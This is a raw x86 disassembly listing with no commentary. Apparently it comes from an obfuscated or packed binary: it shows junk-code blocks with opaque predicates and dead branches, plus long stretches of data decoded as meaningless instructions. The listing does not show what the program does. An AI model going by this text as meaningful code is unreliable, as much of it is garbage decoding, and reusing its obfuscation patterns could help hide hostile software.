  418e65:	pop    ebx
  418e66:	nop
  418e67:	cmp    BYTE PTR [edx-0x4b],0xe7
  418e6b:	data16 loop 0x418e13
  418e6e:	and    DWORD PTR [esi+0x6],ebp
  418e71:	jle    0x418ec6
  418e73:	pop    esp
  418e74:	lods   al,BYTE PTR ds:[esi]
  418e75:	pusha  
  418e76:	ja     0x418e9c
  418e78:	cmp    eax,0x5d7c5fd6
  418e7d:	lods   eax,DWORD PTR ds:[esi]
  418e7e:	jbe    0x418e9f
  418e80:	rcl    BYTE PTR [esi-0x1e],cl
  418e83:	call   0xdf8eb11
  418e88:	push   0xffffffcd
  418e8a:	add    eax,DWORD PTR [eax+0x3b5ecec7]
  418e90:	mov    edx,0xa75bdacd
  418e95:	(bad)  
  418e96:	or     al,0x45
  418e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e99:	and    BYTE PTR [ecx+0x6f],dh
  418e9c:	xchg   ecx,eax
  418e9d:	(bad)  
  418e9e:	in     eax,dx
  418e9f:	repz stc 
  418ea1:	inc    edi
  418ea2:	adc    DWORD PTR [ebx+ebp*8],edx
  418ea5:	(bad)
  418ea8:	mov    DWORD PTR [ebx+0xc15bcda],edx
  418eae:	mov    al,ds:0x23008b79
  418eb3:	leave  
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42838f,0x0
  418ec3:	mov    DWORD PTR ds:0x428157,0x216c
  418ecd:	mov    DWORD PTR ds:0x42825b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428253,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428263,0x562c
  418ef0:	mov    DWORD PTR ds:0x42828b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42838f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428317
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428de4
  418f1a:	not    DWORD PTR ds:0x42818b
  418f20:	sub    DWORD PTR ds:0x42837f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428143
  418f32:	mov    edx,DWORD PTR ds:0x428287
  418f38:	sbb    DWORD PTR ds:0x42836b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282c3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282fb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42837f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428393,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282eb,0x0
  418f6c:	not    DWORD PTR ds:0x428257
  418f72:	not    DWORD PTR ds:0x428187
  418f78:	mov    DWORD PTR ds:0x4282df,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42830f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282eb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42836b
  418fb5:	call   DWORD PTR ds:0x428de8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42821f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42817f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42836f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42817b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42815f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42814f,0x0
  41900e:	mov    DWORD PTR ds:0x428163,0x4347
  419018:	mov    DWORD PTR ds:0x428187,0x6064
  419022:	mov    DWORD PTR ds:0x42826f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428243,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42814f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dec
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282df
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42821b
  41906c:	or     DWORD PTR ds:0x42835f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x728f3402]
  419095:	adc    BYTE PTR [ebp-0x56],0x3f
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1-0x4d4fe7e8],bh
  4190a2:	jmp    DWORD PTR [edi]
  4190a4:	repz and DWORD PTR [esi-0x48],ecx
  4190a8:	loop   0x419034
  4190aa:	add    eax,0xc4600787
  4190af:	icebp  
  4190b0:	mov    gs,ecx
  4190b2:	fs je  0x419086
  4190b5:	pop    edx
  4190b6:	out    0x7a,al
  4190b8:	stos   DWORD PTR es:[edi],eax
  4190b9:	shr    DWORD PTR [eax-0x64],cl
  4190bc:	or     al,0x56
  4190be:	rcr    DWORD PTR [ebp+0x1382f218],cl
  4190c4:	out    dx,al
  4190c5:	retf   0x389b
  4190c8:	and    BYTE PTR [esi+0x404d380a],dh
  4190ce:	mov    ebx,DWORD PTR [ebp-0x40]
  4190d1:	mov    cl,0xd3
  4190d3:	jne    0x4190d7
  4190d5:	xchg   BYTE PTR [ecx-0x5],al
  4190d8:	inc    ebp
  4190d9:	xlat   BYTE PTR ds:[ebx]
  4190da:	aam    0x85
  4190dc:	(bad)  
  4190dd:	imul   ebp,esi,0x2a
  4190e0:	add    eax,0x87dfdb34
  4190e5:	test   al,0x7f
  4190e7:	enter  0x8d6c,0x62
  4190eb:	add    al,0x1e
  4190ed:	je     0x41916b
  4190ef:	retf   
  4190f0:	pop    edi
  4190f1:	add    dh,BYTE PTR [ecx+0x63]
  4190f4:	mov    al,0x84
  4190f6:	mov    BYTE PTR fs:[ecx],bl
  4190f9:	xchg   edi,eax
  4190fa:	dec    esp
  4190fb:	(bad)  [esi-0x2a]
  4190fe:	dec    ebx
  4190ff:	fistp  DWORD PTR [ebp-0x24]
  419102:	add    BYTE PTR [eax],bh
  419104:	sbb    DWORD PTR ds:0xef40e856,ecx
  41910a:	cmp    DWORD PTR [ebp-0x45fea0f9],0xed69a1be
  419114:	loope  0x4190ba
  419116:	jb     0x4190f3
  419118:	bound  ebx,QWORD PTR [esp+edx*2]
  41911b:	inc    edi
  41911c:	sbb    al,0xeb
  41911e:	xor    esi,edi
  419120:	mov    cs,WORD PTR [edi]
  419122:	sbb    cl,BYTE PTR ds:0xe4bfa981
  419128:	adc    al,0x83
  41912a:	sbb    DWORD PTR [eax+0x5016f5aa],eax
  419130:	rcl    BYTE PTR [edx-0x77],1
  419133:	clc    
  419134:	jp     0x4190f0
  419136:	xor    bh,BYTE PTR [ecx+0x593caf20]
  41913c:	adc    BYTE PTR ds:0x3c190225,cl
  419142:	sub    eax,0xfadb8d3f
  419147:	and    al,0x27
  419149:	outs   dx,BYTE PTR ds:[esi]
  41914a:	jo     0x41912c
  41914c:	fstp   QWORD PTR [edx-0x67a0efd6]
  419152:	xor    eax,0x61721ac4
  419157:	ret    0xa12a
  41915a:	sbb    BYTE PTR [esi],ah
  41915c:	dec    eax
  41915d:	arpl   WORD PTR [ecx+edx*2+0x434f5f3d],cx
  419164:	mov    ebx,0x6c0ab1b7
  419169:	or     bh,ah
  41916b:	pop    ebx
  41916c:	fisub  DWORD PTR [eax]
  41916e:	sahf   
  41916f:	xchg   edx,eax
  419170:	sbb    DWORD PTR [edi+eiz*4-0x3a],ebx
  419174:	(bad)  
  419176:	cmp    ebx,DWORD PTR [eax+0x4b1ee113]
  41917c:	stc    
  41917d:	int    0x1e
  41917f:	aas    
  419180:	dec    edi
  419181:	push   edx
  419182:	(bad)  
  419183:	out    0x78,al
  419185:	popf   
  419186:	test   al,0xf6
  419188:	test   eax,0x703612e3
  41918d:	mov    BYTE PTR [ecx-0x7c1f0189],dh
  419193:	push   ebp
  419194:	push   edx
  419195:	or     BYTE PTR [ebx-0x54],cl
  419198:	fs mov esp,0xcbe0a7e4
  41919e:	pop    ss
  41919f:	fnstcw WORD PTR [ebp-0x32]
  4191a2:	mov    ds:0x87de04ab,eax
  4191a7:	mov    ah,0x59
  4191a9:	bound  eax,QWORD PTR [ebx+ecx*4-0x22]
  4191ad:	push   eax
  4191ae:	mov    edi,0xad0cd3ec
  4191b3:	je     0x419143
  4191b5:	sahf   
  4191b6:	out    0x6,eax
  4191b8:	push   ss
  4191b9:	lods   eax,DWORD PTR ds:[esi]
  4191ba:	data16 add BYTE PTR gs:[edi+0x77],ch
  4191bf:	sub    al,0x7b
  4191c1:	iret   
  4191c2:	(bad)
  4191c5:	adc    dl,BYTE PTR [eax]
  4191c7:	pushf  
  4191c8:	push   ebx
  4191c9:	lock inc ebp
  4191cb:	lahf   
  4191cc:	jne    0x419173
  4191ce:	add    al,0x3e
  4191d0:	inc    ebp
  4191d1:	jne    0x419180
  4191d3:	jb     0x4191c9
  4191d5:	cmp    dl,BYTE PTR [edx+esi*2]
  4191d8:	cmp    BYTE PTR [ebx],cl
  4191da:	out    0x24,al
  4191dc:	mov    cl,0xd6
  4191de:	inc    esi
  4191df:	fcom   DWORD PTR [ecx+0x79]
  4191e2:	fwait
  4191e3:	dec    edi
  4191e4:	xchg   esp,eax
  4191e5:	stos   DWORD PTR es:[edi],eax
  4191e6:	sub    bl,BYTE PTR [ebp-0x179b78b4]
  4191ec:	add    ebx,DWORD PTR [esi-0x48]
  4191ef:	popa   
  4191f0:	lds    edi,FWORD PTR [edx-0x2e]
  4191f3:	inc    edx
  4191f4:	pop    ss
  4191f5:	cmp    eax,0x26f134b6
  4191fa:	sbb    BYTE PTR [ecx-0x6fd54d62],ah
  419200:	sub    DWORD PTR [ecx],esp
  419202:	jg     0x3333f5d
  419208:	pusha  
  419209:	mov    ebp,0xd43d6449
  41920e:	fwait
  41920f:	sar    DWORD PTR [edi+0x7b],1
  419212:	mov    ah,0xa0
  419214:	adc    cl,BYTE PTR [ebx]
  419216:	xor    bl,BYTE PTR [esi+esi*2-0x47daf175]
  41921d:	pop    eax
  41921e:	outs   dx,BYTE PTR ds:[esi]
  41921f:	fs and ebp,ebx
  419222:	inc    eax
  419223:	xchg   DWORD PTR [edi+0xa13062b],esp
  419229:	(bad)  
  41922a:	test   DWORD PTR [eax+ebp*4],0x8fbecccb
  419231:	(bad)  
  419232:	sti    
  419233:	ret    
  419234:	sub    BYTE PTR ds:0x8f922d69,bh
  41923a:	cmp    DWORD PTR [ebx],0xa9a26ea5
  419240:	mov    ebp,0x2894b7a9
  419245:	mov    al,ds:0x68fddb8c
  41924a:	loopne 0x4192ad
  41924c:	call   0x59c46eac
  419251:	mov    ebp,0x11ed468b
  419256:	push   eax
  419257:	imul   esp,DWORD PTR [ecx-0x33069002],0xadc85616
  419261:	pop    esi
  419262:	cmp    BYTE PTR [ebx],bl
  419264:	arpl   WORD PTR [ecx-0x3718c8eb],ax
  41926a:	or     edx,DWORD PTR [edi]
  41926c:	ficom  DWORD PTR [edx]
  41926e:	jg     0x419296
  419270:	sbb    DWORD PTR [eax-0x3adf5a4],ebp
  419276:	in     al,0x27
  419278:	das    
  419279:	cmp    BYTE PTR [edx+0x7],0xd5
  41927d:	fnsave [eax]
  41927f:	jbe    0x419203
  419281:	daa    
  419282:	mov    ds:0xf57fee3f,eax
  419287:	mov    al,0x8d
  419289:	outs   dx,DWORD PTR ds:[esi]
  41928a:	xchg   ebx,eax
  41928b:	push   cs
  41928c:	cmp    eax,0xb8a0f403
  419291:	xor    DWORD PTR [ecx+ecx*8+0x230bbdf3],0xffffff92
  419299:	icebp  
  41929a:	push   esp
  41929b:	pusha  
  41929c:	and    eax,edx
  41929e:	sbb    eax,0x1d309c35
  4192a3:	xor    BYTE PTR [edx],bl
  4192a5:	stos   BYTE PTR es:[edi],al
  4192a6:	inc    esp
  4192a7:	inc    edx
  4192a8:	xor    esp,DWORD PTR [ecx+0x19]
  4192ab:	daa    
  4192ac:	imul   edi,DWORD PTR [ebp-0x7a91166d],0x7
  4192b3:	xlat   BYTE PTR ds:[ebx]
  4192b4:	lea    ebx,ds:0xe3bf729f
  4192ba:	adc    eax,0xfbede378
  4192bf:	das    
  4192c0:	jae    0x4192ce
  4192c2:	int3   
  4192c3:	les    ecx,FWORD PTR [edi+0x75e2adb5]
  4192c9:	es daa 
  4192cb:	inc    eax
  4192cc:	nop
  4192cd:	push   ds
  4192ce:	fsubr  st(5),st
  4192d0:	lahf   
  4192d1:	lods   eax,DWORD PTR ds:[esi]
  4192d2:	fisub  DWORD PTR [esi-0x63451ced]
  4192d8:	(bad)  
  4192d9:	leave  
  4192da:	ja     0x419325
  4192dc:	mov    ds:0x1d4ece0f,eax
  4192e1:	arpl   WORD PTR [ebp+0x49],bx
  4192e4:	imul   ebx,DWORD PTR ds:0x5703b1e2,0x15
  4192eb:	jg     0x419359
  4192ed:	mov    ecx,0x7ae7a7a5
  4192f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192f3:	push   ebx
  4192f4:	leave  
  4192f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f6:	fsub   QWORD PTR [eax-0x71ec3088]
  4192fc:	iret   
  4192fd:	cdq    
  4192fe:	fwait
  4192ff:	add    edx,DWORD PTR ds:0xd38449e2
  419305:	add    BYTE PTR [ecx+0x4b],bl
  419308:	add    BYTE PTR [ebx-0x6143a5f],0x47
  41930f:	or     eax,0x676d4eae
  419314:	mov    eax,0x2630f4cd
  419319:	pop    ebp
  41931a:	inc    esi
  41931b:	mov    al,0x9e
  41931d:	into   
  41931e:	jo     0x419323
  419320:	jbe    0x419350
  419322:	xchg   esp,eax
  419323:	les    ebp,FWORD PTR [ecx-0x1a472ada]
  419329:	sub    al,0x1c
  41932b:	dec    eax
  41932c:	jo     0x419395
  41932e:	mov    edx,db3
  419331:	jbe    0x4193b2
  419333:	push   es
  419334:	or     BYTE PTR [ecx],bl
  419336:	mov    ebp,0xfcbedf19
  41933b:	outs   dx,BYTE PTR ds:[esi]
  41933c:	stos   BYTE PTR es:[edi],al
  41933d:	mov    ?,WORD PTR [esi+0x52]
  419340:	std    
  419341:	mov    edi,0x8b7ce4fe
  419346:	bound  edi,QWORD PTR [eax+0x69026840]
  41934c:	xor    eax,0x1cf7bafe
  419351:	das    
  419352:	cld    
  419353:	jae    0x419306
  419355:	ins    DWORD PTR es:[edi],dx
  419356:	mov    esp,DWORD PTR [esi-0x3a]
  419359:	mov    edx,DWORD PTR [esi+0x3c4adee0]
  41935f:	ins    DWORD PTR es:[edi],dx
  419360:	mov    dh,BYTE PTR [esi]
  419362:	xchg   ecx,eax
  419363:	inc    eax
  419364:	pushf  
  419365:	jg     0x419355
  419367:	pop    edi
  419368:	shl    DWORD PTR [ebx-0x32],0x5f
  41936c:	xchg   edi,eax
  41936d:	call   0x11a9cc20
  419372:	add    DWORD PTR [edx+0x4e],ecx
  419375:	(bad)  
  419376:	adc    ebx,DWORD PTR [eax+0x2ab1cd7d]
  41937c:	mov    ebx,ebp
  41937e:	jmp    0x41934b
  419380:	(bad)  
  419381:	aam    0xfa
  419383:	and    al,0x4e
  419385:	rcr    BYTE PTR [eax+0x7c89512d],0x58
  41938c:	retf   0xcec
  41938f:	pop    ebp
  419390:	mov    bh,0xac
  419392:	jbe    0x419369
  419394:	sbb    al,0xd2
  419396:	sub    bh,dh
  419398:	xor    dh,BYTE PTR [ebp+ebx*1-0xe]
  41939c:	sbb    DWORD PTR [ecx+0x73],esi
  41939f:	pop    edx
  4193a0:	pusha  
  4193a1:	cmp    BYTE PTR [edx-0x5e11d247],bl
  4193a7:	rol    DWORD PTR [esi+0x2abdf95],1
  4193ad:	lock mov ds:0x6f11689,al
  4193b3:	(bad)  
  4193b4:	add    al,0x8f
  4193b6:	pop    ss
  4193b7:	mov    ds:0x590aa197,eax
  4193bc:	jecxz  0x41939f
  4193be:	adc    ebx,edi
  4193c0:	xor    ebp,edx
  4193c2:	sbb    esi,eax
  4193c4:	xchg   ebx,eax
  4193c5:	or     BYTE PTR [ebx+0x3f365fc2],al
  4193cb:	in     al,dx
  4193cc:	and    DWORD PTR [ebx+0x33],eax
  4193cf:	adc    BYTE PTR [edi-0xdd561a4],0x7
  4193d6:	cmp    DWORD PTR [edx-0x47],esi
  4193d9:	(bad)  
  4193da:	retf   0x185a
  4193dd:	mov    ebp,0xb8d399b8
  4193e2:	pop    edi
  4193e3:	hlt    
  4193e4:	stc    
  4193e5:	sub    esp,0x1e63f53f
  4193eb:	jmp    0xe179318e
  4193f0:	stos   BYTE PTR es:[edi],al
  4193f1:	(bad)  
  4193f2:	push   ss
  4193f3:	jge    0x4193f2
  4193f5:	fbld   TBYTE PTR [esi+esi*8]
  4193f8:	add    eax,0x2c06ed68
  4193fd:	pop    ebp
  4193fe:	xor    ax,dx
  419401:	jmp    0x419466
  419403:	leave  
  419404:	(bad)  
  419407:	int    0x6c
  419409:	(bad)  
  41940a:	jmp    0xa563:0x50edc52c
  419411:	sti    
  419412:	(bad)  
  419413:	mov    esi,0x3a19f46a
  419418:	mov    edi,0x8eca6ee
  41941d:	ins    BYTE PTR es:[edi],dx
  41941e:	mov    ds:0x48b7759f,eax
  419423:	addr16 cmp edi,eax
  419426:	pop    es
  419427:	jno    0x4193fc
  419429:	mov    bl,0x7a
  41942b:	stos   BYTE PTR es:[edi],al
  41942c:	test   eax,ebx
  41942e:	jl     0x4193e6
  419430:	cmp    bh,al
  419432:	daa    
  419433:	dec    eax
  419434:	and    BYTE PTR [edx+0x5846503d],0x98
  41943b:	mov    ch,0x88
  41943d:	mov    ebp,ss
  41943f:	(bad)  
  419440:	sub    al,0xe1
  419442:	cmp    al,0x43
  419444:	aad    0x7f
  419446:	jle    0x41944f
  419448:	sbb    al,0xcf
  41944a:	dec    ebp
  41944b:	clc    
  41944c:	div    DWORD PTR [ecx]
  41944e:	mov    ebp,DWORD PTR [ebx-0x33]
  419451:	jb     0x4193de
  419453:	mov    WORD PTR [esp+eax*4],fs
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	das    
  419460:	add    BYTE PTR [edx+0x0],0x0
  419464:	mov    DWORD PTR ds:0x428387,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428393,0x3a28
  419482:	cmp    DWORD PTR ds:0x42822f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428df0
  41949a:	mov    DWORD PTR ds:0x42826b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282d3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42830b,edx
  4194b2:	mov    DWORD PTR ds:0x428293,0x52b1
  4194bc:	or     DWORD PTR ds:0x42816b,edx
  4194c2:	and    DWORD PTR ds:0x42836f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428317,0x0
  4194cf:	mov    DWORD PTR ds:0x428317,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428293,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428393,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42816f,0x3203
  419506:	cmp    DWORD PTR ds:0x428317,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280ab
  419518:	push   0x42808f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e84
  419528:	adc    DWORD PTR ds:0x428177,0x266f
  419532:	xor    DWORD PTR ds:0x42836f,ebx
  419538:	xor    DWORD PTR ds:0x4282f7,ecx
  41953e:	mov    DWORD PTR ds:0x428167,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428243
  41954e:	dec    DWORD PTR ds:0x4282f7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282e7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42837b,0x428397
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42817f,0x0
  419589:	mov    DWORD PTR ds:0x42816f,0x514f
  419593:	mov    DWORD PTR ds:0x428173,0x65eb
  41959d:	mov    DWORD PTR ds:0x428223,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428283,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42817f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42803d
  4195cd:	push   0x428059
  4195d2:	call   DWORD PTR ds:0x428e88
  4195d8:	adc    DWORD PTR ds:0x428297,ecx
  4195de:	and    DWORD PTR ds:0x42828b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428163,ebx
  4195ee:	and    DWORD PTR ds:0x42826f,0x6136
  4195f8:	add    DWORD PTR ds:0x428177,ebx
  4195fe:	mov    eax,ds:0x422548
  419603:	and    DWORD PTR ds:0x4282ff,0x428267
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42815b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428183,0x428157
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428267,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428297,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42826f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428283,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428173,0x428143
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428277,0x42823f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42815b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42815b,0x4282e7
  4196ab:	push   0x4223cc
  4196b0:	sbb    DWORD PTR ds:0x428273,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42821b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42822f
  4196da:	sbb    DWORD PTR ds:0x428313,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428243,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42825f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42822b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428363,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282df
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42825b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428373,0x5836
  419737:	cmp    DWORD PTR ds:0x428363,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428df4
  41974d:	movzx  edx,BYTE PTR ds:0x42815b
  419754:	adc    DWORD PTR ds:0x4282e3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428297
  419761:	add    DWORD PTR ds:0x42817b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42828f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42817b,0x0
  419781:	mov    DWORD PTR ds:0x428243,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42825b,ebx
  419797:	cmp    DWORD PTR ds:0x42817b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428df8
  4197bf:	sub    DWORD PTR ds:0x428273,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282ef,0x42822f
  4197d3:	add    DWORD PTR ds:0x42824f,0x428177
  4197dd:	mov    ebx,DWORD PTR ds:0x428197
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282a7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428227,ecx
  4197f8:	and    DWORD PTR ds:0x42827f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282ff
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42817b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428367,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428307,0x6cf
  41984e:	mov    DWORD PTR ds:0x428393,0x6551
  419858:	cmp    DWORD PTR ds:0x42817b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e8c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42839b
  419891:	mov    ecx,DWORD PTR ds:0x42839f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42828b
  4198a2:	cmp    DWORD PTR ds:0x42814f,0x0
  4198a9:	mov    DWORD PTR ds:0x428143,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42830f
  4198ba:	not    DWORD PTR ds:0x428303
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42814f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dfc
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428273
  4198e5:	and    DWORD PTR ds:0x42830b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282df
  4198f1:	sbb    DWORD PTR ds:0x428167,edx
  4198f7:	or     DWORD PTR ds:0x4282f7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428263,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42820f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428213
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428307,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42821b,0x4551
  419946:	mov    DWORD PTR ds:0x42827f,0x487
  419950:	cmp    DWORD PTR ds:0x428307,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e00
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
